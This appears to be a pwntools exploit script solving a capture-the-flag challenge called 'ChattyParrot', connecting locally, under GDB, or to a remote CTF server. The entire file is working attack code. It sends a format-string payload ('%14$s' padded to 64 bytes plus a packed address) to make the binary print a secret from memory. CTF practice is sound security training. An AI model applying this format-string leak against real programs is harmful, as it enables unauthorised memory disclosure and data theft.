from pwn import *

filePath = './ChattyParrot'

def start_process():
    if args.GDB:
        return gdb.debug(filePath, gdbscript='''
            b vuln
        ''')
    elif args.REMOTE:
        return remote("ctf.mf.grsu.by", 9077)
    else:
        return process(filePath)

p = start_process()

secret_addr = 0x00000000004040a0

N = 14 #offset

payload = b'%' + str(N).encode() + b'$s'  #format part 
payload = payload + b'A' * (64 - len(payload)) #make offset
payload = payload + p64(secret_addr) #target addr

p.sendline(payload)

p.interactive()
